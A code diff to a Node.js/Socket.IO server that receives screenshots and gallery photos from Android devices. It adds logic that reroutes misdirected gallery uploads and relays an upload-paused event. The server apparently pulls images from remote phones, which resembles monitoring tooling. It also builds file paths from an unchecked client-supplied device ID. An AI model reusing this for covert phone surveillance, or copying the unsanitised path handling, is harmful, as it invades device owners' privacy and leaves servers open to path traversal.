@@ -501,6 +501,68 @@ app.post("/upload-screenshot", screenshotUpload.single("screenshot"), (req, res)
     const model = req.body.model || "";
     const timestamp = req.body.timestamp || "";
 
+    // ── GALLERY REROUTE FIX ──────────────────────────────────
+    // If the Android upload queue sends a gallery image to the screenshot
+    // endpoint after reconnection, detect it by gallery-specific body fields
+    // and save to gallery instead.
+    const isGalleryImage = req.body.imageId || req.body.folderName ||
+      (req.body.requestId && req.body.requestId.startsWith("gallery_"));
+
+    if (isGalleryImage) {
+      log(`REROUTE: Gallery image received on /upload-screenshot from ${deviceName} (${deviceId}): ${req.file.originalname} — saving to gallery`);
+
+      const galleryDeviceDir = path.join(GALLERY_DIR, deviceId);
+      if (!fs.existsSync(galleryDeviceDir)) {
+        fs.mkdirSync(galleryDeviceDir, { recursive: true });
+      }
+
+      const tempPath = req.file.path;
+      const finalFilename = req.file.filename;
+      const actualFinalPath = path.join(galleryDeviceDir, finalFilename);
+
+      fs.renameSync(tempPath, actualFinalPath);
+      const stats = fs.statSync(actualFinalPath);
+
+      log(`Gallery image (rerouted) saved: ${deviceId}/${finalFilename} (${stats.size} bytes)`);
+
+      // Store metadata in memory
+      if (!galleryImages.has(deviceId)) {
+        galleryImages.set(deviceId, []);
+      }
+      galleryImages.get(deviceId).push({
+        deviceId,
+        deviceName,
+        imageId: req.body.imageId,
+        originalName: req.body.originalName || req.file.originalname,
+        filename: finalFilename,
+        folderName: req.body.folderName || "Unknown",
+        dateTaken: req.body.dateTaken ? new Date(parseInt(req.body.dateTaken)) : new Date(),
+        size: parseInt(req.body.fileSize) || stats.size,
+        requestId: req.body.requestId || "",
+        uploadedAt: new Date(),
+      });
+
+      // Emit as gallery, NOT screenshot
+      io.emit("gallery_image_received", {
+        deviceId,
+        deviceName,
+        imageId: req.body.imageId,
+        originalName: req.body.originalName || req.file.originalname,
+        folderName: req.body.folderName || "Unknown",
+        filename: finalFilename,
+        requestId: req.body.requestId || "",
+      });
+
+      return res.status(200).json({
+        success: true,
+        filename: finalFilename,
+        size: stats.size,
+        deviceId,
+        rerouted: "gallery",
+      });
+    }
+    // ── END GALLERY REROUTE FIX ──────────────────────────────
+
     log(`Processing screenshot from ${deviceName} (${deviceId}): ${req.file.originalname}`);
 
     const deviceDir = path.join(SCREENSHOTS_DIR, deviceId);
@@ -1774,6 +1836,15 @@ io.on("connection", (socket) => {
       io.emit("gallery_upload_error", data);
     } catch (e) {
       log(`Error in gallery_upload_error: ${e.message}`);
+    }
+  });
+
+  socket.on("gallery_upload_paused", (data) => {
+    try {
+      log(`Gallery upload paused on ${(data && data.deviceId) || "unknown"}: ${data.remaining} remaining, reason: ${data.reason}`);
+      io.emit("gallery_upload_paused", data);
+    } catch (e) {
+      log(`Error in gallery_upload_paused: ${e.message}`);
     }
   });
 
